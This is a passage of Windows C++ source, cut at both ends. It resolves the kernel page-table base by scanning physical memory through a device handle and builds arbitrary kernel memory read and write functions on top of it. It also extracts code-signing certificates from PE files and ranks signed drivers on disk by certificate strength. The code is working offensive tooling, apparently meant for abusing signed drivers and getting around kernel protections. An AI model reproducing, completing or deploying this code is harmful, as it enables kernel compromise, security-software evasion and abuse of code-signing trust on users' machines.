    static BOOL VerifyCR3Candidate(HANDLE device, ULONGLONG cr3Candidate, ULONGLONG ntoskrnlVA) {
        if (ntoskrnlVA == 0) {
            return FALSE;
        }

        ULONGLONG physAddr = VirtualToPhysicalWithCR3(device, cr3Candidate, ntoskrnlVA);
        if (physAddr == 0) {
            return FALSE;
        }

        UCHAR mzHeader[2] = { 0 };
        if (!NT_SUCCESS(ReadPhysicalMemory(device, physAddr, mzHeader, 2))) {
            return FALSE;
        }

        if (mzHeader[0] == 0x4D && mzHeader[1] == 0x5A) {
            return TRUE;
        }

        return FALSE;
    }

    static ULONGLONG TryResolveSystemDtbFromCandidate(HANDLE device, ULONGLONG testCR3, ULONGLONG psInitialSystemProcess, ULONGLONG ntoskrnlBase) {
        if ((testCR3 & 0xFFFULL) != 0 || !IsPhysAddrSafe(testCR3)) {
            return 0;
        }

        ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, psInitialSystemProcess);
        if (physPsInit == 0) {
            return 0;
        }

        ULONGLONG systemEprocess = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
            return 0;
        }

        if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
            return 0;
        }

        ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
        if (physEprocess == 0) {
            return 0;
        }

        ULONGLONG dtb = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
            return 0;
        }

        dtb &= ~0xFFFULL;
        if (dtb == 0 || !IsPhysAddrSafe(dtb)) {
            return 0;
        }

        if (!VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
            return 0;
        }

        return dtb;
    }

    static ULONGLONG FindKernelCR3FromRamMap(HANDLE device, ULONGLONG psInitialSystemProcess, ULONGLONG ntoskrnlBase) {
        std::vector<PhysicalRange> ranges;
        if (!QueryPhysicalMemoryRanges(ranges)) {
            VLOG("ram_map_cr3_resolve skipped reason=physical_ranges_unavailable");
            return 0;
        }

        const ULONGLONG pml4Index = (ntoskrnlBase >> 39) & 0x1FF;
        const ULONGLONG pml4Offset = pml4Index * 8;
        const ULONGLONG chunkSize = 0x1000000ULL;
        ULONGLONG pagesChecked = 0;
        ULONGLONG presentKernelEntries = 0;
        ULONGLONG exactCandidates = 0;
        const ULONGLONG startTick = GetTickCount64();

        for (const auto& range : ranges) {
            ULONGLONG cursor = range.base;
            ULONGLONG rangeEnd = range.base + range.size;
            while (cursor < rangeEnd) {
                ULONGLONG remaining = rangeEnd - cursor;
                ULONG mapSize = static_cast<ULONG>(remaining > chunkSize ? chunkSize : remaining);
                mapSize &= ~0xFFFUL;
                if (mapSize == 0) {
                    break;
                }

                PVOID mapped = nullptr;
                NTSTATUS mapStatus = MapPhysicalMemory(device, cursor, mapSize, &mapped);
                if (!NT_SUCCESS(mapStatus) || mapped == nullptr) {
                    if (mapSize > 0x1000) {
                        mapSize = 0x1000;
                        mapStatus = MapPhysicalMemory(device, cursor, mapSize, &mapped);
                    }
                }

                if (NT_SUCCESS(mapStatus) && mapped != nullptr) {
                    const BYTE* bytes = static_cast<const BYTE*>(mapped);
                    for (ULONG offset = 0; offset + 0x1000 <= mapSize; offset += 0x1000) {
                        ++pagesChecked;
                        ULONGLONG pml4e = 0;
                        if (!ReadMappedU64(bytes + offset + pml4Offset, &pml4e)) {
                            continue;
                        }

                        if ((pml4e & 1) == 0 || (pml4e & 0x80) != 0) {
                            continue;
                        }

                        const ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
                        if (!IsPhysAddrSafe(pdptPhys)) {
                            continue;
                        }

                        ++presentKernelEntries;
                        const ULONGLONG candidate = cursor + offset;
                        const ULONGLONG dtb = TryResolveSystemDtbFromCandidate(device, candidate, psInitialSystemProcess, ntoskrnlBase);
                        if (dtb != 0) {
                            ++exactCandidates;
                            UnmapPhysicalMemory(device, mapped);
                            VLOG("ram_map_cr3_resolve success dtb=0x%llX source_candidate=0x%llX pages_checked=%llu present_kernel_entries=%llu exact_candidates=%llu elapsed_ms=%llu",
                                 dtb, candidate, pagesChecked, presentKernelEntries, exactCandidates, VElapsedMs(startTick));
                            return dtb;
                        }
                    }

                    UnmapPhysicalMemory(device, mapped);
                }

                cursor += mapSize;
            }
        }

        VLOG("ram_map_cr3_resolve exhausted pages_checked=%llu present_kernel_entries=%llu exact_candidates=%llu elapsed_ms=%llu",
             pagesChecked, presentKernelEntries, exactCandidates, VElapsedMs(startTick));
        return 0;
    }

    static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
        VLOG("=== GetKernelCR3FromEPROCESS ===");
        PVOID pPsInitialSystemProcess = KernelUtils::GetKernelProcAddress(
            (PVOID)ntoskrnlBase, "PsInitialSystemProcess");

        if (!pPsInitialSystemProcess) {
            VLOG("ERROR: PsInitialSystemProcess not found!");
            return 0;
        }
        VLOG("PsInitialSystemProcess kernel addr: %p", pPsInitialSystemProcess);

        // Initialize max physical address for bounds checking
        GetMaxPhysicalAddress();

        // Extended candidate list: common CR3 locations on Win10 AND Win11 24H2/25H2
        static const ULONGLONG lowCR3Candidates[] = {
            // Win10 common
            0x1AD000, 0x1AB000, 0x1A9000, 0x1A7000,
            0x1B0000, 0x1B2000, 0x1B4000, 0x1B6000,
            0x100000, 0x102000, 0x104000, 0x106000,
            0x180000, 0x182000, 0x184000, 0x186000,
            0x200000, 0x202000, 0x204000, 0x206000,
            0x300000, 0x400000, 0x500000, 0x600000,
            // Win11 24H2/25H2 tend to use higher addresses
            0x800000, 0x900000, 0xA00000, 0xB00000,
            0xC00000, 0xD00000, 0xE00000, 0xF00000,
            0x1000000, 0x1100000, 0x1200000, 0x1400000,
            0x1600000, 0x1800000, 0x1A00000, 0x1C00000,
            0x2000000, 0x2200000, 0x2400000, 0x2800000,
            0x3000000, 0x4000000, 0x5000000, 0x6000000,
            0x7000000, 0x8000000, 0x9000000, 0xA000000,
        };

        VLOG("Trying %zu fast CR3 candidates...", sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]));

        for (int i = 0; i < sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]); i++) {
            ULONGLONG testCR3 = lowCR3Candidates[i];

            ULONGLONG dtb = TryResolveSystemDtbFromCandidate(device, testCR3, (ULONGLONG)pPsInitialSystemProcess, ntoskrnlBase);
            if (dtb != 0) {
                VLOG("Found kernel CR3 via EPROCESS: 0x%llX (from candidate 0x%llX)",
                     dtb, lowCR3Candidates[i]);
                return dtb;
            }
        }

        VLOG("Fast CR3 candidates exhausted; resolving through verified physical RAM ranges");

        ULONGLONG ramMapDtb = FindKernelCR3FromRamMap(device, (ULONGLONG)pPsInitialSystemProcess, ntoskrnlBase);
        if (ramMapDtb != 0) {
            VLOG("Found kernel CR3 via physical RAM map: 0x%llX", ramMapDtb);
            return ramMapDtb;
        }

        VLOG("FATAL: Could not find kernel CR3!");
        return 0;
    }

    static ULONGLONG FindKernelCR3(HANDLE device, ULONGLONG ntoskrnlBase) {
        VLOG("FindKernelCR3: ntoskrnlBase=0x%llX", ntoskrnlBase);
        ULONGLONG cr3 = GetKernelCR3FromEPROCESS(device, ntoskrnlBase);
        if (cr3 != 0) {
            VLOG("Kernel CR3 = 0x%llX", cr3);
            return cr3;
        }

        VLOG("FATAL: FindKernelCR3 failed!");
        return 0;
    }

    ULONGLONG VirtualToPhysical(HANDLE device, PVOID virtualAddress) {
        ULONGLONG va = (ULONGLONG)virtualAddress;

        if (g_KernelCR3 == 0) {
            VLOG("CR3 cache empty, resolving...");
            if (g_NtoskrnlBase == 0) {
                g_NtoskrnlBase = (ULONGLONG)KernelUtils::GetKernelModuleBase("ntoskrnl.exe");
                VLOG("ntoskrnl base = 0x%llX", g_NtoskrnlBase);
            }
            g_KernelCR3 = FindKernelCR3(device, g_NtoskrnlBase);
            if (g_KernelCR3 == 0) {
                VLOG("ERROR: VirtualToPhysical - CR3 resolution failed for VA=%p", virtualAddress);
                return 0;
            }
            VLOG("CR3 cached: 0x%llX", g_KernelCR3);
        }

        return VirtualToPhysicalWithCR3(device, g_KernelCR3, va);
    }

    NTSTATUS ReadKernelMemory(HANDLE device, PVOID address, PVOID buffer, SIZE_T size) {
        const ULONGLONG readStartTick = GetTickCount64();
        VLOG("ReadKernelMemory ENTER device=%p address=%p buffer=%p size=0x%llX pid=%lu tid=%lu build=%lu cached_cr3=0x%llX nt_base=0x%llX",
            device,
            address,
            buffer,
            static_cast<unsigned long long>(size),
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            VBuildNumber(),
            static_cast<unsigned long long>(g_KernelCR3),
            static_cast<unsigned long long>(g_NtoskrnlBase));
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            VLOG("ReadKernelMemory: INVALID DEVICE HANDLE");
            return STATUS_INVALID_HANDLE;
        }
        if (!buffer || size == 0) {
            VLOG("ReadKernelMemory: INVALID PARAMETER buffer=%p size=0x%llX",
                buffer,
                static_cast<unsigned long long>(size));
            return STATUS_INVALID_PARAMETER;
        }

        ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
        PUCHAR outBuf = static_cast<PUCHAR>(buffer);
        SIZE_T remaining = size;
        SIZE_T chunkCount = 0;

        while (remaining > 0) {
            ULONGLONG pageOffset = va & 0xFFF;
            SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));
            chunkCount++;

            ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
            if (physAddr == 0) {
                VLOG("ReadKernelMemory: VA->PA translation failed for VA=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
                    va,
                    static_cast<unsigned long long>(chunkCount),
                    static_cast<unsigned long long>(g_KernelCR3),
                    static_cast<unsigned long long>(g_NtoskrnlBase),
                    static_cast<unsigned long long>(GetTickCount64() - readStartTick));
                return STATUS_UNSUCCESSFUL;
            }

            NTSTATUS status = ReadPhysicalMemory(device, physAddr, outBuf, chunkSize);
            if (!NT_SUCCESS(status)) {
                VLOG("ReadKernelMemory: ReadPhysicalMemory failed, VA=0x%llX PA=0x%llX chunk=0x%llX chunks=%llu status=0x%08X elapsed_ms=%llu",
                     va,
                     physAddr,
                     static_cast<unsigned long long>(chunkSize),
                     static_cast<unsigned long long>(chunkCount),
                     (DWORD)status,
                     static_cast<unsigned long long>(GetTickCount64() - readStartTick));
                return status;
            }

            va += chunkSize;
            outBuf += chunkSize;
            remaining -= chunkSize;
        }

        VLOG("ReadKernelMemory EXIT status=0x%08X address=%p size=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
            static_cast<DWORD>(STATUS_SUCCESS),
            address,
            static_cast<unsigned long long>(size),
            static_cast<unsigned long long>(chunkCount),
            static_cast<unsigned long long>(g_KernelCR3),
            static_cast<unsigned long long>(g_NtoskrnlBase),
            static_cast<unsigned long long>(GetTickCount64() - readStartTick));
        return STATUS_SUCCESS;
    }

    NTSTATUS WriteKernelMemory(HANDLE device, PVOID address, PVOID data, SIZE_T size) {
        const ULONGLONG writeStartTick = GetTickCount64();
        VLOG("WriteKernelMemory ENTER device=%p address=%p data=%p size=0x%llX pid=%lu tid=%lu build=%lu cached_cr3=0x%llX nt_base=0x%llX",
            device,
            address,
            data,
            static_cast<unsigned long long>(size),
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            VBuildNumber(),
            static_cast<unsigned long long>(g_KernelCR3),
            static_cast<unsigned long long>(g_NtoskrnlBase));
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            VLOG("WriteKernelMemory: INVALID DEVICE HANDLE");
            return STATUS_INVALID_HANDLE;
        }
        if (!data || size == 0) {
            VLOG("WriteKernelMemory: INVALID PARAMETER data=%p size=0x%llX",
                data,
                static_cast<unsigned long long>(size));
            return STATUS_INVALID_PARAMETER;
        }

        ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
        PUCHAR inBuf = static_cast<PUCHAR>(data);
        SIZE_T remaining = size;
        SIZE_T chunkCount = 0;

        while (remaining > 0) {
            ULONGLONG pageOffset = va & 0xFFF;
            SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));
            chunkCount++;

            ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
            if (physAddr == 0) {
                VLOG("WriteKernelMemory: VA->PA translation failed for VA=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
                    va,
                    static_cast<unsigned long long>(chunkCount),
                    static_cast<unsigned long long>(g_KernelCR3),
                    static_cast<unsigned long long>(g_NtoskrnlBase),
                    static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
                return STATUS_UNSUCCESSFUL;
            }

            NTSTATUS status = WritePhysicalMemory(device, physAddr, inBuf, chunkSize);
            if (!NT_SUCCESS(status)) {
                VLOG("WriteKernelMemory: WritePhysicalMemory failed, VA=0x%llX PA=0x%llX chunk=0x%llX chunks=%llu status=0x%08X elapsed_ms=%llu",
                     va,
                     physAddr,
                     static_cast<unsigned long long>(chunkSize),
                     static_cast<unsigned long long>(chunkCount),
                     (DWORD)status,
                     static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
                return status;
            }

            va += chunkSize;
            inBuf += chunkSize;
            remaining -= chunkSize;
        }

        VLOG("WriteKernelMemory EXIT status=0x%08X address=%p size=0x%llX chunks=%llu cached_cr3=0x%llX nt_base=0x%llX elapsed_ms=%llu",
            static_cast<DWORD>(STATUS_SUCCESS),
            address,
            static_cast<unsigned long long>(size),
            static_cast<unsigned long long>(chunkCount),
            static_cast<unsigned long long>(g_KernelCR3),
            static_cast<unsigned long long>(g_NtoskrnlBase),
            static_cast<unsigned long long>(GetTickCount64() - writeStartTick));
        return STATUS_SUCCESS;
    }

    NTSTATUS ReadMsr(HANDLE device, ULONG msrIndex, PULONGLONG value) {
        (void)device;
        (void)msrIndex;
        (void)value;
        return STATUS_NOT_SUPPORTED;
    }

    NTSTATUS WriteMsr(HANDLE device, ULONG msrIndex, ULONGLONG value) {
        (void)device;
        (void)msrIndex;
        (void)value;
        return STATUS_NOT_SUPPORTED;
    }

    VOID ResetCR3Cache() {
        g_KernelCR3 = 0;
        g_NtoskrnlBase = 0;
    }

    VOID CloseDevice(HANDLE deviceHandle) {
        if (deviceHandle && deviceHandle != INVALID_HANDLE_VALUE) {
            NtClose(deviceHandle);
        }
    }

}

namespace SignedMemory {

    struct CERT_BUFFER {
        BYTE* Data;
        DWORD Size;
    };

    static const char* g_EVPolicyOIDs[] = {
        "2.23.140.1.1",
        "2.23.140.1.3",
        "2.23.140.1.4.1",
        "1.3.6.1.4.1.311.94.1.1",
        "2.16.840.1.114414.1.7.23.3",
        "2.16.840.1.113733.1.7.23.6",
        "2.16.840.1.113733.1.7.48.1",
        "1.3.6.1.4.1.6449.2.1.1",
        "1.3.6.1.4.1.6449.1.2.1.5.1",
        "1.3.6.1.4.1.44947.1.1.1",
        "2.16.840.1.114028.10.1.2",
        "1.3.6.1.4.1.14370.1.6",
        "1.3.6.1.4.1.4788.2.202.1",
        "2.16.840.1.114413.1.7.23.3",
        "1.3.6.1.4.1.8024.0.2.100.1.2",
        "2.16.756.1.89.1.2.1.1",
        "2.16.840.1.114412.2.1",
        "2.16.840.1.114412.3.2",
        "1.3.6.1.4.1.4146.1.1",
        "1.2.616.1.113527.2.5.1.1",
        "1.3.171.1.1.10.5.2",
        "1.3.6.1.4.1.34697.2.1",
        "1.3.6.1.4.1.40869.1.1.22.3",
        "2.16.840.1.114171.500.9",
        "2.16.578.1.26.1.3.3",
        "1.3.6.1.4.1.17326.10.14.2.1.2",
        "1.3.6.1.4.1.22234.2.5.2.3.1",
        "2.16.840.1.114404.1.1.2.4.1",
        "1.3.6.1.4.1.23223.1.1.1",
    };

    static BOOL ExtractCertificateData(LPCWSTR filePath, CERT_BUFFER* outCert) {
        if (!filePath || !outCert) return FALSE;
        outCert->Data = nullptr;
        outCert->Size = 0;

        HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize < 4096) {
            CloseHandle(hFile);
            return FALSE;
        }

        BYTE* fileData = (BYTE*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!fileData) {
            CloseHandle(hFile);
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hFile, fileData, fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            CloseHandle(hFile);
            return FALSE;
        }
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileData;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(fileData + dos->e_lfanew);
        if (ntHdr->Signature != IMAGE_NT_SIGNATURE) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        IMAGE_DATA_DIRECTORY secDir = {};
        if (ntHdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)ntHdr;
            if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) {
                VirtualFree(fileData, 0, MEM_RELEASE);
                return FALSE;
            }
            secDir = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
        } else if (ntHdr->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
            PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)ntHdr;
            if (nt32->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) {
                VirtualFree(fileData, 0, MEM_RELEASE);
                return FALSE;
            }
            secDir = nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
        } else {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        if (secDir.VirtualAddress == 0 || secDir.Size < sizeof(WIN_CERTIFICATE) ||
            secDir.VirtualAddress + secDir.Size > fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        outCert->Data = (BYTE*)VirtualAlloc(nullptr, secDir.Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!outCert->Data) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        memcpy(outCert->Data, fileData + secDir.VirtualAddress, secDir.Size);
        outCert->Size = secDir.Size;

        VirtualFree(fileData, 0, MEM_RELEASE);
        return TRUE;
    }

    static int ScoreDriverCertificate(LPCWSTR filePath) {


        DWORD dwEncoding = 0, dwContentType = 0, dwFormatType = 0;
        HCERTSTORE hStore = NULL;
        HCRYPTMSG hMsg = NULL;

        BOOL hasEmbeddedSignature = CryptQueryObject(
            CERT_QUERY_OBJECT_FILE,
            filePath,
            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
            CERT_QUERY_FORMAT_FLAG_BINARY,
            0,
            &dwEncoding,
            &dwContentType,
            &dwFormatType,
            &hStore,
            &hMsg,
            NULL
        );

        if (!hasEmbeddedSignature) {
            return 0;
        }

        if (hStore) CertCloseStore(hStore, 0);
        if (hMsg) CryptMsgClose(hMsg);

        int score = 1;

        WINTRUST_FILE_INFO fileInfo = {};
        fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
        fileInfo.pcwszFilePath = filePath;

        GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

        WINTRUST_DATA trustData = {};
        trustData.cbStruct = sizeof(WINTRUST_DATA);
        trustData.dwUIChoice = WTD_UI_NONE;
        trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
        trustData.dwUnionChoice = WTD_CHOICE_FILE;
        trustData.pFile = &fileInfo;
        trustData.dwStateAction = WTD_STATEACTION_VERIFY;
        trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

        LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

        if (lStatus == ERROR_SUCCESS) {
            score += 200;
        } else if (lStatus == (LONG)CERT_E_EXPIRED) {
            score += 50;
        } else if (lStatus == (LONG)CERT_E_UNTRUSTEDROOT || lStatus == (LONG)CRYPT_E_SECURITY_SETTINGS) {
            score += 10;
        }

        if (trustData.hWVTStateData) {
            CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
            if (prov) {
                CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
                if (sgnr) {
                    if (sgnr->csCounterSigners > 0) {
                        score += 50;
                        CRYPT_PROVIDER_SGNR* csSgnr = WTHelperGetProvSignerFromChain(prov, 0, TRUE, 0);
                        if (csSgnr && csSgnr->pChainContext && csSgnr->pChainContext->cChain > 0) {
                            CERT_SIMPLE_CHAIN* csChain = csSgnr->pChainContext->rgpChain[0];
                            if (csChain->cElement > 0) {
                                PCCERT_CONTEXT csCert = csChain->rgpElement[0]->pCertContext;
                                FILETIME now;
                                GetSystemTimeAsFileTime(&now);
                                if (CompareFileTime(&now, &csCert->pCertInfo->NotAfter) < 0) {
                                    score += 100;
                                }
                            }
                        }
                    }

                    if (sgnr->pChainContext) {
                        for (DWORD c = 0; c < sgnr->pChainContext->cChain; c++) {
                            CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[c];
                            for (DWORD e = 0; e < chain->cElement; e++) {
                                PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                                FILETIME ftNow;
                                GetSystemTimeAsFileTime(&ftNow);
                                if (CompareFileTime(&ftNow, &cert->pCertInfo->NotAfter) < 0 &&
                                    CompareFileTime(&ftNow, &cert->pCertInfo->NotBefore) > 0) {
                                    score += 25;
                                }

                                PCERT_EXTENSION pExt = CertFindExtension(
                                    szOID_CERT_POLICIES,
                                    cert->pCertInfo->cExtension,
                                    cert->pCertInfo->rgExtension);
                                if (pExt) {
                                    CERT_POLICIES_INFO* polInfo = nullptr;
                                    DWORD cbDecoded = 0;
                                    if (CryptDecodeObjectEx(
                                        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                        X509_CERT_POLICIES,
                                        pExt->Value.pbData,
                                        pExt->Value.cbData,
                                        CRYPT_DECODE_ALLOC_FLAG,
                                        nullptr,
                                        &polInfo,
                                        &cbDecoded) && polInfo) {
                                        for (DWORD p = 0; p < polInfo->cPolicyInfo; p++) {
                                            for (int oid = 0; oid < sizeof(g_EVPolicyOIDs) / sizeof(g_EVPolicyOIDs[0]); oid++) {
                                                if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, g_EVPolicyOIDs[oid]) == 0) {
                                                    score += 1000;
                                                }
                                            }
                                        }
                                        LocalFree(polInfo);
                                    }
                                }
                            }
                        }

                        if (sgnr->pChainContext->cChain > 0) {
                            CERT_SIMPLE_CHAIN* leafChain = sgnr->pChainContext->rgpChain[0];
                            if (leafChain->cElement > 0) {
                                PCCERT_CONTEXT leafCert = leafChain->rgpElement[0]->pCertContext;
                                SYSTEMTIME st;
                                FileTimeToSystemTime(&leafCert->pCertInfo->NotAfter, &st);
                                if (st.wYear >= 2027) score += 200;
                                else if (st.wYear >= 2026) score += 150;
                                else if (st.wYear >= 2025) score += 100;
                                else if (st.wYear >= 2024) score += 50;
                            }
                        }
                    }
                }
            }
        }

        trustData.dwStateAction = WTD_STATEACTION_CLOSE;
        WinVerifyTrust(NULL, &actionGUID, &trustData);

        return score;
    }

    static DWORD ComputePEChecksum(BYTE* peData, DWORD peSize) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS ntBase = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);

        DWORD checksumFieldOffset;
        if (ntBase->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            checksumFieldOffset = (DWORD)((BYTE*)&((PIMAGE_NT_HEADERS64)ntBase)->OptionalHeader.CheckSum - peData);
        } else {
            checksumFieldOffset = (DWORD)((BYTE*)&((PIMAGE_NT_HEADERS32)ntBase)->OptionalHeader.CheckSum - peData);
        }

        DWORD csWord1 = checksumFieldOffset / 2;
        DWORD csWord2 = csWord1 + 1;
        DWORD wordCount = peSize / 2;
        USHORT* ptr = (USHORT*)peData;

        ULONGLONG sum = 0;
        for (DWORD i = 0; i < wordCount; i++) {
            if (i == csWord1 || i == csWord2) continue;
            sum += ptr[i];
            sum = (sum & 0xFFFF) + (sum >> 16);
        }

        if (peSize & 1) {
            sum += peData[peSize - 1];
            sum = (sum & 0xFFFF) + (sum >> 16);
        }

        sum = (sum & 0xFFFF) + (sum >> 16);
        sum += peSize;

        return (DWORD)sum;
    }

    static BOOL ScanDirectoryForSignedDriver(LPCWSTR directory, LPCWSTR pattern,
        WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV, int* pBestScore) {
        WCHAR searchPattern[MAX_PATH];
        wcscpy_s(searchPattern, directory);
        wcscat_s(searchPattern, L"\\");
        wcscat_s(searchPattern, pattern);

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return FALSE;

        BOOL foundBetter = FALSE;

        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (fd.nFileSizeLow < 8192) continue;

            WCHAR fullPath[MAX_PATH];
            wcscpy_s(fullPath, directory);
            wcscat_s(fullPath, L"\\");
            wcscat_s(fullPath, fd.cFileName);

            HANDLE hFile = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (hFile == INVALID_HANDLE_VALUE) continue;

            BYTE hdrBuf[4096];
            DWORD br = 0;
            BOOL readOk = ReadFile(hFile, hdrBuf, sizeof(hdrBuf), &br, nullptr);
            CloseHandle(hFile);

            if (!readOk || br < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) continue;

            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdrBuf;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
            if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;

            PIMAGE_NT_HEADERS ntHdrScan = (PIMAGE_NT_HEADERS)(hdrBuf + dos->e_lfanew);
            if (ntHdrScan->Signature != IMAGE_NT_SIGNATURE) continue;

            IMAGE_DATA_DIRECTORY secDir = {};
            if (ntHdrScan->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
                PIMAGE_NT_HEADERS64 nt64s = (PIMAGE_NT_HEADERS64)ntHdrScan;
                if (nt64s->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                secDir = nt64s->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
            } else if (ntHdrScan->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
                PIMAGE_NT_HEADERS32 nt32s = (PIMAGE_NT_HEADERS32)ntHdrScan;
                if (nt32s->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                secDir = nt32s->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
            } else {
                continue;
            }
            if (secDir.VirtualAddress == 0 || secDir.Size < 128) continue;

            int fileScore = ScoreDriverCertificate(fullPath);
            if (fileScore > *pBestScore) {
                *pBestScore = fileScore;
                wcscpy_s(outPath, outChars, fullPath);
                *outIsEV = (fileScore >= 1000);
                foundBetter = TRUE;

                if (fileScore >= 1000) break;
            }

        } while (FindNextFileW(hFind, &fd));

        FindClose(hFind);
        return foundBetter;
    }

    static void ScanDirectoryRecursive(LPCWSTR directory, LPCWSTR pattern,
        WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV, int* pBestScore, int maxDepth) {
        if (maxDepth <= 0 || *pBestScore >= 1000) return;

        ScanDirectoryForSignedDriver(directory, pattern, outPath, outChars, outIsEV, pBestScore);
        if (*pBestScore >= 1000) return;

        WCHAR searchPath[MAX_PATH];
        if (wcslen(directory) + 3 >= MAX_PATH) return;
        wcscpy_s(searchPath, directory);
        wcscat_s(searchPath, L"\\*");

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return;

        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

            WCHAR subDir[MAX_PATH];
            if (wcslen(directory) + wcslen(fd.cFileName) + 2 >= MAX_PATH) continue;
            wcscpy_s(subDir, directory);
